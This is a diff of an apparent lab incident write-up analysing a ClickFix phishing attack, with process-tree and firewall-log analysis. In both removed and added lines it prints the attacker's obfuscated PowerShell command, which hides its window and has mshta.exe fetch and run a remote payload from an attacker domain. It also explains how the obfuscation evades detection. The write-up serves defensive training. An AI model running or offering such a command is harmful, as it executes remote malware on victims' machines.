@@ -41,24 +41,53 @@ The email impersonated Microsoft, used a fake countdown timer for urgency, and p
 
 ### 2. Endpoint Analysis
 
-Browser history confirms the visit to `windows-update.site` at 23:26:08. Seconds later, PowerShell launched `mshta.exe` to retrieve the remote payload:
+### 2. Endpoint Analysis
 
-```
-powershell.exe -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
-```
+Browser history confirms the visit to `windows-update.site` at 23:26:08.
 
-A second, obfuscated variant ran at 23:26:32:
-
-```
-powershell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824''
-```
-
-`-w 1` hides the window, the `-replace` trick rebuilds "mshta.exe" to evade detection, and the trailing comment is what the user sees in the Run box, making it look like a CAPTCHA check. `mshta.exe` is a legitimate Windows binary abused here to run remote code, and the `.mp4` extension disguises the payload.
-
-<img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
 <img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />
+
+The ClickFix command placed in the user's clipboard was:
+
+```
+PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824''
+```
+
+- `-w 1` runs PowerShell with a hidden window.
+- `-replace ']'` strips the brackets, rebuilding `mshta.exe` so the name never appears in plain text (evades simple detection).
+- Everything after `#` is a comment. It's what the user sees at the end of the Run box, making the command look like a CAPTCHA check.
+
 <img width="1225" height="520" alt="338-terminal" src="https://github.com/user-attachments/assets/ef98cb5d-eaa3-4944-9ccf-207ef88a08dc" />
 
+The process logs show the command was likely run **twice**:
+
+<img width="560" height="447" alt="SOC338-ProcessesView" src="https://github.com/user-attachments/assets/dc098e5e-c703-4a43-b96f-da40394efbdb" />
+
+
+**First execution (23:26:20):** `mshta.exe` (PID 7284) launched from a PowerShell parent with the payload URL, connected to the payload server, and spawned `conhost.exe`, suggesting the payload may have started a console process. No PowerShell process appears in the logs before 23:26:20, so its parent could not be identified. PIDs 624 and 7308 started later and could not have launched it.
+
+<img width="525" height="206" alt="SOC-338FirstOne" src="https://github.com/user-attachments/assets/c21e73ce-6369-4f2a-bf73-acfe60bae780" />
+
+
+**Second execution (23:26:31–32):**
+
+```
+explorer.exe
+└─ powershell.exe (PID 624)    pasted command, launched from the Run dialog
+   └─ powershell.exe (PID 7308)  -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
+      └─ mshta.exe               https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
+```
+
+<img width="707" height="167" alt="SOC338-SecondExecution" src="https://github.com/user-attachments/assets/8159e2fb-5375-42c4-b1b2-77b1736d4014" />
+
+<img width="675" height="205" alt="SOC-338MoreExecution" src="https://github.com/user-attachments/assets/87d18735-339a-422d-b7d3-17eac6aa18ea" />
+
+
+PID 624's parent, `explorer.exe`, confirms the command was run manually from the Run dialog. A repeat execution is consistent with a user retrying after nothing visibly happened. Because the first execution's parent is missing from the logs, the order may instead reflect a lab timestamp inconsistency.
+
+`mshta.exe` is a legitimate Windows binary for running HTML Applications, abused here to execute remote code. The `.mp4` extension disguises the payload. All processes ran as `EC2AMAZ-ILGVOIN\LetsDefend`.
+
+<img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
 ### 3. Network Analysis
 
 Firewall logs show `mshta.exe` (PID 7284) making an allowed HTTPS connection from `172.16.17.216:34211` to `172.67.139.19:443`, with a request URL matching the payload. The IP is in Cloudflare's range, so it fronts the attacker's server rather than identifying it directly.
